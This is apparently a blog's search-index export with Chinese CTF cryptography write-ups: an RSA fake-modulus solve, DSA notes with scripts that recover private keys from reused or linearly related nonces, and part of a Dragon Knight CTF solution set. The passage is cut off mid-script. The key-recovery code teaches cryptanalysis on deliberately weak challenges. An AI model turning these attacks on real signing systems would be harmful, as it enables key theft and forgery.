<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024BeginCTF Crypto--fake_N</title>
    <url>/2024/03/14/2024BeginCTF-Crypto-fake-N/</url>
    <content><![CDATA[<h1 id="FIRST"><a href="#FIRST" class="headerlink" title="FIRST"></a>FIRST</h1><span id="more"></span>

<p>首先分解fake_n,使用factordb.com，得到17个质因子</p>
<p><img src="/pic/2024BeginCTF-Crypto-fake-N/factor.png" alt="factor"></p>
<h1 id="second"><a href="#second" class="headerlink" title="second"></a>second</h1><p>阅读题目得真实的n为15个质因子的积，遍历17个质因子中15个的积作为真实的n，并求出phi，写出对应脚本为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">fake_n_list=[<span class="number">2215221821</span> , <span class="number">2290486867</span> , <span class="number">2333428577</span> , <span class="number">2361589081</span> , <span class="number">2446301969</span> , <span class="number">2507934301</span>, <span class="number">2590663067</span> ,<span class="number">3107210929</span> ,<span class="number">3278987191</span>,<span class="number">3389689241</span>,<span class="number">3417707929</span>,<span class="number">3429664037</span>,<span class="number">3716624207</span>, <span class="number">3859354699</span>, <span class="number">3965529989</span>, <span class="number">4098704749</span>, <span class="number">4267348123</span>]</span><br><span class="line">c = <span class="number">6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line">fake_n = <span class="number">1</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">    fake_n *= fake_n_list[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">        n=fake_n//(fake_n_list[i]*fake_n_list[k])</span><br><span class="line">        phi=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> fake_n_list:</span><br><span class="line">            <span class="keyword">if</span>(j!=fake_n_list[i] <span class="keyword">and</span> j!=fake_n_list[k]):</span><br><span class="line">                phi=phi*(j-<span class="number">1</span>)</span><br><span class="line">        d=inverse(e,phi)</span><br><span class="line">        x=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">b&#x27;begin&#x27;</span> <span class="keyword">in</span> x):</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>

<p>得到结果为</p>
<p>begin{y0u_f1nd_th3_re4l_n}</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>DSA签名</title>
    <url>/2024/08/17/DSA%E7%AD%BE%E5%90%8D/</url>
    <content><![CDATA[<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><span id="more"></span>

<h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><ol>
<li>选择一个合适的哈希函数，目前一般选择 SHA1，当前也可以选择强度更高的哈希函数 H。</li>
<li>^选择密钥的长度^ L 和 N，这两个值决定了签名的安全程度。在最初的 DSS（<strong>Digital Signature Standard</strong> ）中建议 L 必须为 64 的倍数，并且512≤L≤1024 ，当然，也可以更大。N 必须大小必须不大于哈希函数 H 输出的长度。</li>
<li>选择 N 比特的素数 q。</li>
<li>选择 L 比特的素数 p，使得 p-1 是 q 的倍数。</li>
<li>选择满足 g^k^≡1modp的最小正整数 k 为 q 的 g，即在模 p 的背景下，ord(g)&#x3D;q 的 g。即 g 在模 p 的意义下，其指数次幂可以生成具有 q 个元素的子群。这里，我们可以通过计算g&#x3D;h$$\frac{p-1}{q}$$modp 来得到 g，其中1&lt;h&lt;p−1 。</li>
<li>选择私钥 x，0&lt;x&lt;q ，计算y≡g^x^modp 。</li>
</ol>
<p>公钥为 (p,q,g,y)，私钥为 (x)。</p>
<h2 id="进行签名"><a href="#进行签名" class="headerlink" title="进行签名"></a>进行签名</h2><ol>
<li>选择随机整数数 k 作为临时密钥，0&lt;k&lt;q0&lt;k&lt;q 。</li>
<li>计算r≡(g^k^modp)modq</li>
<li>计算s≡(H(m)+xr)k^−1^modq</li>
</ol>
<p>签名结果为 (r,s)。H(m)为明文的哈希值。</p>
<h2 id="验证过程"><a href="#验证过程" class="headerlink" title="验证过程"></a>验证过程</h2><ol>
<li>计算辅助值，w&#x3D;s^−1^modq</li>
<li>计算辅助值，u1&#x3D;H(m)wmodq</li>
<li>计算辅助值，u2&#x3D;rwmodq</li>
<li>计算v&#x3D;(g^u1^y^u2^modp)modq</li>
<li>如果 v 与 r 相等，则校验成功。</li>
</ol>
<h1 id="题型总结"><a href="#题型总结" class="headerlink" title="题型总结"></a>题型总结</h1><h2 id="1，已知随机密钥k"><a href="#1，已知随机密钥k" class="headerlink" title="1，已知随机密钥k"></a>1，已知随机密钥k</h2><p>已知k时，我们就可以根据s≡(H(m)+xr)k^−1^modq 推出x≡r^−1^(ks−H(m))modq，一般这类题的H都会给出。</p>
<h2 id="2，多个签名使用相同密钥k"><a href="#2，多个签名使用相同密钥k" class="headerlink" title="2，多个签名使用相同密钥k"></a>2，多个签名使用相同密钥k</h2><p>举个栗子[]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512,md5</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">message</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(sha512(message).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_gen</span>():</span><br><span class="line">	q = getPrime(<span class="number">256</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		p = random.getrandbits(<span class="number">2816</span>)*q + <span class="number">1</span></span><br><span class="line">		<span class="keyword">if</span> isPrime(p):</span><br><span class="line">			<span class="built_in">print</span>(p.bit_length())</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		g = <span class="built_in">pow</span>(random.randrange(<span class="number">1</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)/q, p)</span><br><span class="line">		<span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	x = random.randrange(<span class="number">1</span>, q)</span><br><span class="line">	y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">	pubkey = (p, q, g, y)</span><br><span class="line">	privkey = x</span><br><span class="line">	<span class="keyword">return</span> pubkey, privkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, pubkey, privkey</span>):</span><br><span class="line">	p, q, g, y = pubkey</span><br><span class="line">	x = privkey</span><br><span class="line">	k = <span class="built_in">pow</span>(y, x, g) * random.randrange(<span class="number">1</span>, <span class="number">512</span>) % q</span><br><span class="line">	r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">	s = inverse(k, q) * (<span class="built_in">hash</span>(message) + x * r) % q</span><br><span class="line">	<span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">message, signature, pubkey</span>):</span><br><span class="line">	p, q, g, y = pubkey</span><br><span class="line">	r, s = signature</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; q) <span class="keyword">or</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; s &lt; q):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	w = inverse(s, q)</span><br><span class="line">	u1 = (<span class="built_in">hash</span>(message) * w) % q</span><br><span class="line">	u2 = (r * w) % q</span><br><span class="line">	v = ((<span class="built_in">pow</span>(g, u1, p) * <span class="built_in">pow</span>(y, u2, p)) % p) % q</span><br><span class="line">	<span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line">pubkey, privkey = key_gen()</span><br><span class="line"><span class="built_in">print</span>(pubkey)</span><br><span class="line"></span><br><span class="line">message1 = urandom(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">signature1 = sign(message1, pubkey, privkey)</span><br><span class="line"><span class="built_in">print</span>(message1,signature1)</span><br><span class="line"><span class="built_in">print</span>(verify(message1, signature1, pubkey))</span><br><span class="line"></span><br><span class="line">message2 = urandom(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">signature2 = sign(message2, pubkey, privkey)</span><br><span class="line"><span class="built_in">print</span>(message2,signature2)</span><br><span class="line"><span class="built_in">print</span>(verify(message2, signature2, pubkey))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span>+md5(long_to_bytes(privkey)).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>显然是一个经典的复用k的情况，但是做了一点小小的升级</p>
<p>注意看这一段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, pubkey, privkey</span>):</span><br><span class="line">	p, q, g, y = pubkey</span><br><span class="line">	x = privkey</span><br><span class="line">	k = <span class="built_in">pow</span>(y, x, g) * random.randrange(<span class="number">1</span>, <span class="number">512</span>) % q</span><br><span class="line">	r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">	s = inverse(k, q) * (<span class="built_in">hash</span>(message) + x * r) % q</span><br><span class="line">	<span class="keyword">return</span> r, s</span><br></pre></td></tr></table></figure>

<p>原版dsa的sign中<code>k = pow(y, x, g) % q</code></p>
<p>而此题<code>k = pow(y, x, g) * random.randrange(1, 512) % q</code></p>
<p>乘了一个随机数。(其实可以直接穷举爆出来的)</p>
<p>那么来一点小小的推导吧</p>
<p>两组数据，则有两个表达式，如下<br>k1s1 &#x3D; (H(M1)+xr1) mod q<br>k2s2 &#x3D; (H(M2)+xr2) mod q<br>同时也有<br>k1 &#x3D; (y^x^ mod g * random1) mod q<br>k2 &#x3D; (y^x^ mod g * random2) mod q<br>k1，k2表达式，将随机数移到左边<br>k1 * random1^-1^ &#x3D; （y^x^ mod g) mod q<br>k2 * random2^-1^ &#x3D; （y^x^ mod g) mod q<br>所以得到：k1 * random1^-1^ &#x3D; k2 * random2^-1^<br>此式子缺乏x，需要引入含有x的表达式，ks &#x3D; (H(M)+xr) mod q，两边同时乘以s1s2<br>k1 * random1^-1^ * s1<em>s2 &#x3D; k2 * random2^-1^ * s1</em>s2<br>式子也等价于<br>H(M1)random1^-1^ <em>s2 + xr1</em>random1^-1^ * s2 &#x3D; H(M2)random2^-1^ <em>s1 + xr2</em>random2^-1^ * s1<br>再化简<br>H(M1)random1^-1^ <em>s2 * random2 + xr1</em>random1^-1^ * s2 * random2 &#x3D; H(M2) * s1 + xr2<em>s1<br>移项<br>H(M1)random1^-1^ <em>s2 * random2 - H(M2) * s1 &#x3D; xr2</em>s1  - xr1</em>random1^-1^ * s2 * random2<br>x &#x3D; H(M1)<em>random1^-1^ <em>s2 * random2 - H(M2) * s1 &#x2F; (r2</em>s1 - r1</em>random1^-1^ * s2 * random2)</p>
<p>除法改成乘法的逆即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512,md5</span><br><span class="line"></span><br><span class="line">pubkey = (<span class="number">3297226463037324458008837284498963372649038889390685051849680175016505646001761220109858921624266044035133134135402561235635833428206886888308027772353030767400921078346868377298401213812053250316002033941692272192644613252296579884516731560436501073253924457646558698855484781747029397755111633297587215976579633451933658235385386539518006570069653575146060016811911140614606471930327341368582979836042585406811352236326065292636484550807213756482153084427714549694264685695977531537425682212155553568848666088576932888234659355213664909753781753917401161977762663658097504411914908081677033980915039079517766159760522261279115347385813009437510156898969769563687869495721977265444799585634019880951532080217960456901788918439265788169910062822889580199366417455186595489973000351770200485095008494228829300145039695936946379585625051402553034971207474762463147744467360158847593356030745194143276254949463650698210515569533L</span>,<span class="number">82302835442112137125891403368151249910268706824854786126600390413622302196443L</span>,<span class="number">1156233264299340971106498371495495695225880592354374034142195518472540521911699506391311324676590685365234887170345722135060009885002334748836477169806166169806180231794918961214520698361874839110454610266388341977984902756569838594616255112661600466818870137432772800368859461445854700956291885576855069405183771903076277144927769029433730710613058788277691211698675287829143272152835171859480781061918556840079857761203012054552142555673071865310355331986288606422711525790877591376770834180618492794265362178603111236615495225612101250344421932588038244804199229449738675082560512062564365473035097263889257937140778993389305893378514344032352806521972367991027459721160744835688761657797398841523104074451793557924512992305640697344011520550723893828185707635141404445213445935586965289450282024222064488965878769991566367115153619761583843561579531705057955933288008556165952066173304891391375100346312776539530448611005L</span>,<span class="number">290999623787731812697719691852061290246619413463636312382146969900546384514710782843153962704851916091601679028830866176332331519515156301401537173069908181509028464322647352256632424684809349121024262597006913707483811117644197481959053785475083406472583099140506505071300193356002443007750220524932219191932969202270343323955035291396808472686684787610559114702054784699365490860392737061056233160308943296478540798353134878937088336672928162894332961762277559345860479916248086821117811990391025187125193074059001086441305977133252774698996653122297123447837449168657347308016270030881395674066421144002959751936839166935726200833785132736328859710351871352567511516142170956091885352178579302299634322254818383978585773136692588922976043617337904545396146755609284163743476297772686548475170197605412847689587171522453229055932712714154869989454808561458852031769119489235598402066924082778376081494632258448434048562053L</span>)</span><br><span class="line">p,q,g,y = pubkey</span><br><span class="line"></span><br><span class="line">message1xx = (<span class="string">b&#x27;0234e7971889def7e60348f77db94b7a&#x27;</span>,(<span class="number">10859236269959765735236393779936305217305574331839234502190226708929991582386L</span>,<span class="number">13707557323895695260471053137828523837745895683218331343360027380310980108819L</span>))</span><br><span class="line"></span><br><span class="line">message1 = <span class="string">b&#x27;0234e7971889def7e60348f77db94b7a&#x27;</span></span><br><span class="line">r1 = <span class="number">10859236269959765735236393779936305217305574331839234502190226708929991582386L</span></span><br><span class="line">s1 = <span class="number">13707557323895695260471053137828523837745895683218331343360027380310980108819L</span></span><br><span class="line"></span><br><span class="line">message2 = <span class="string">b&#x27;16c5ac270b72f70319657b4410d985d4&#x27;</span></span><br><span class="line">r2 = <span class="number">41960642246379067640524709416001536058292817319109764317369777224426218746518L</span></span><br><span class="line">s2 = <span class="number">74676725322515593502346275468843411563746982149373670021082686341369076719088L</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">message</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(sha512(message).hexdigest(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">message, pubkey, privkey,randoms</span>):</span><br><span class="line">        p, q, g, y = pubkey</span><br><span class="line">        x = privkey</span><br><span class="line">        k = <span class="built_in">pow</span>(y,x,g) * randoms</span><br><span class="line">        r = <span class="built_in">pow</span>(g,k,p)%q</span><br><span class="line">        s = inverse(k,q)*(<span class="built_in">hash</span>(message)+x*r)%q</span><br><span class="line">        <span class="keyword">return</span> r,s</span><br><span class="line"></span><br><span class="line">H1 = <span class="built_in">hash</span>(message1)</span><br><span class="line">H2 = <span class="built_in">hash</span>(message2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = H(M1)*random1^-1 *s2 * random2 - H(M2) * s1 / (r2*s1 - r1*random1^-1 * s2 * random2)</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Now attack start...&quot;</span></span><br><span class="line"><span class="keyword">for</span> random2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">512</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Now random2 is:%d\n&quot;</span> % random2</span><br><span class="line">    <span class="keyword">for</span> random1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">512</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Now random1 is:%d&quot;</span> %random1</span><br><span class="line">        random1_inverse = inverse(random1,q)</span><br><span class="line">        x = (H1*random1_inverse*s2*random2-H2*s1) * inverse(r2*s1-r1*random1_inverse*s2*random2,q)%q</span><br><span class="line">        <span class="keyword">if</span> sign(message1,pubkey,x,random1) == message1xx[<span class="number">1</span>]:</span><br><span class="line">            flag = <span class="string">&#x27;flag&#123;&#x27;</span>+md5(long_to_bytes(x)).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Success!&quot;</span></span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>虽然但是随机数好像要爆蛮久……</p>
<h2 id="3，不同次签名使用的k存在线性关系"><a href="#3，不同次签名使用的k存在线性关系" class="headerlink" title="3，不同次签名使用的k存在线性关系"></a>3，不同次签名使用的k存在线性关系</h2><p>找了半天没看到合适的例题，只有拿Dexter佬的水一水捏</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">FLAG = <span class="string">b&#x27;******************&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">FLAG = FLAG[<span class="number">7</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg, pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(<span class="built_in">pow</span>(g, k, p) % q)</span><br><span class="line">    h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    s = <span class="built_in">int</span>((h + x * r) * invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line">p = <span class="number">12521300600879647215212622604478307167614802603722694432672492518732844280050451647647783544918670551333939947202324314036106883627652934658092246151569719841172139651756731975948641752941369320985906043813128667949407263418091261521078015038472125264708315959943830171678415621896727622381651264882655845219115471323352719455064712014904581019529062436850895982568432772820884304927292484611574315452532539622439874476205201585972439739033662281856954069390915294301650596122027017512657387126870291348326594014789938826560641601265413964203409968207292456857314148848395645091850604205535043035332961436498283695843</span></span><br><span class="line">q = <span class="number">89333150710898097819726085329049525002843220030438497258487456281988064920981</span></span><br><span class="line">g = <span class="number">4659169190462665152432024005060362819268084070474399613244522271693166269703240438309526888954293382169994621221386886590606442329876391429681914154130453072540079426475110538234340272617964838185872575922598867083747162403217264242469640383596415974818773608247780785279490355462362699968367544837511541267300331418420849521244364899679912282991493675152166261501255315036943693486335864565853496499243373834189894710718862409646613179068080762011713847012853815796678705445232715083564615906424779193638984542271665075749327914765645357163924702265124479067028868769369414557728443665123548337757950887923116453268</span></span><br><span class="line">x = bytes_to_long(FLAG)</span><br><span class="line">y = powmod(g, x, p)</span><br><span class="line"></span><br><span class="line">pub = (p,q,g,y)</span><br><span class="line">pri = x</span><br><span class="line"></span><br><span class="line">nonce = getPrime(<span class="number">64</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;y =&#x27;</span>, y)</span><br><span class="line"><span class="built_in">print</span>(sign(<span class="string">b&#x27;nssctfround#1&#x27;</span>, pub, pri, nonce))</span><br><span class="line"><span class="built_in">print</span>(sign(<span class="string">b&#x27;nssctfround#1&#x27;</span>, pub, pri, <span class="number">12345</span>*nonce + <span class="number">67890</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">y = 516079379252376231001717898324355848864109868582016554029703521946402522000955354396295307046881971504216991061930299508521161039333927590076006514531946316725453062373440451679354041777376121961468715242703413529070177041819221792817124111175287475946526246377103779752133378942603534385789689950337366490082828044596711426514502752548887337695502949798115745655734033592905036846835127551577851715558217775334831352232997052342694255476534837857477388530834954919414905007702912216496977764789386913244009912368937860550222726279524193115767983754873150853915852619223039800432272818237552774389220137762595332280</span></span><br><span class="line"><span class="string">(81900716895065212453759953296615257914462909922962929287345063257120550453427, 45144894416226080526306932143570511284754744855790908537643986192724824691890)</span></span><br><span class="line"><span class="string">(60471460394555700734359895323450929800168788093422384886037011624642263106556, 74754852228035293908666429128869604520827363733944834534730568060790683199921)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>附上丑丑的推导</p>
<p><img src="https://ice.frostsky.com/2024/08/23/c572b534fc3cd26be69322c1fcf23c68.png" alt="c572b534fc3cd26be69322c1fcf23c68.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y = </span><br><span class="line">r1,s1 = (, )</span><br><span class="line">r2,s2 = (, )</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">g = </span><br><span class="line">msg = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line">k = ((h*(r2 - r1) + b*r1*s2)*gmpy2.invert((r2*s1-a*r1*s2),q)) % q</span><br><span class="line"></span><br><span class="line">m1 = (k*s1 - h)*gmpy2.invert(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"></span><br><span class="line">k1 = a*k+b</span><br><span class="line"></span><br><span class="line">m2 = (k1*s2 - h)*gmpy2.invert(r2,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有的题型遇到了再补上叭……</p>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>Dragon Knight CTF官方wp</title>
    <url>/2024/07/25/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/</url>
    <content><![CDATA[<p>wwwww</p>
<h1 id="题目复现网站"><a href="#题目复现网站" class="headerlink" title="题目复现网站"></a>题目复现网站</h1><p><a href="https://www.qsnctf.com/#/main/driving-range">https://www.qsnctf.com/#/main/driving-range</a></p>
<span id="more"></span>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a><strong>签到</strong></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">output = [<span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span>,</span><br><span class="line">          <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span>,</span><br><span class="line">          <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span>,</span><br><span class="line">          <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span>,</span><br><span class="line">          <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(output)):</span><br><span class="line">    t.append(output[i] - output[i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">T = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(t) - <span class="number">1</span>):</span><br><span class="line">    T.append(t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(T) - <span class="number">1</span>):</span><br><span class="line">    mm = gmpy2.gcd(T[i], T[i + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> isPrime(mm):</span><br><span class="line">        m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime(mm // i):</span><br><span class="line">                mm = mm // i</span><br><span class="line">                m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    a = gmpy2.invert(t[<span class="number">0</span>], i) * t[<span class="number">1</span>] % i</span><br><span class="line">    b = output[<span class="number">1</span>] - a * output[<span class="number">0</span>] % i</span><br><span class="line">    a_ = gmpy2.invert(a, i)</span><br><span class="line"></span><br><span class="line">    seed = a_ * (output[<span class="number">0</span>] - b) % i</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">        seed = a_ * (seed - b) % i</span><br><span class="line">        flag = long_to_bytes(seed)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Matrix-revenge"><a href="#Matrix-revenge" class="headerlink" title="Matrix_revenge"></a><strong>Matrix_revenge</strong></h3><p>出这个revenge版主要是希望师傅们学到一般线性群的阶<br>4阶模p矩阵的阶为<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406273-9536b7c5-8b55-4019-9978-d00499a33b71.svg" alt="image.png"><br>然后就是和RSA一样的思路<br>求一个d，满足<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733406274-de4f17a8-f412-49f6-a249-f548b2c6bb8b.svg" alt="image.png"><br><a href="https://exp.py/">exp.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">724011645798721468405549293573288113</span>   </span><br><span class="line">q = <span class="number">712853480230590736297703668944546433</span></span><br><span class="line">C = [(<span class="number">354904294318305224658454053059339790915904962123902870614765704810196137</span>, <span class="number">307912599668649689143528844269686459695648563337814923172488152872006235</span>, <span class="number">143644686443811064172873392982322248654471792394264352463341325181752577</span>, <span class="number">22995887787365556743279529792687264972121816670422146768160153217903088</span>), (<span class="number">111349308911096779758451570594323566987628804920420784718347230085486245</span>, <span class="number">370237591900013263581099395076767089468466012835217658851568690263421449</span>, <span class="number">305451886364184428434479088589515273362629589399867618474106045683764897</span>, <span class="number">454103583344277343974714791669312753685583930212748198341578178464249150</span>), (<span class="number">168497521640129742759262423369385500102664740971338844248603058993335309</span>, <span class="number">228941893018899960301839898935872289351667488000643221589230804176281482</span>, <span class="number">340080333594340128998141220817079770261711483018587969623825086357581002</span>, <span class="number">122922413789905368029659916865893297311475500951645918611759627764993518</span>), (<span class="number">10332477229415731242316540110058798318207430965033579181240340751539101</span>, <span class="number">238172263316130590821973648893483382211906906298557131324791759298887701</span>, <span class="number">487586702165464601760230182019344052665496627253691596871783460314632260</span>, <span class="number">12238020921585443139790088280608644406695242899000592355653073240122626</span>)]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">phip = (p-<span class="number">1</span>)*(p+<span class="number">1</span>)*(p^<span class="number">2</span>+p+<span class="number">1</span>)*p*(p^<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">phiq = (q-<span class="number">1</span>)*(q+<span class="number">1</span>)*(q^<span class="number">2</span>+q+<span class="number">1</span>)*q*(q^<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phip*phiq)</span><br><span class="line"></span><br><span class="line">C = Matrix(Zmod(n),C)</span><br><span class="line"></span><br><span class="line">M = C ** d</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span 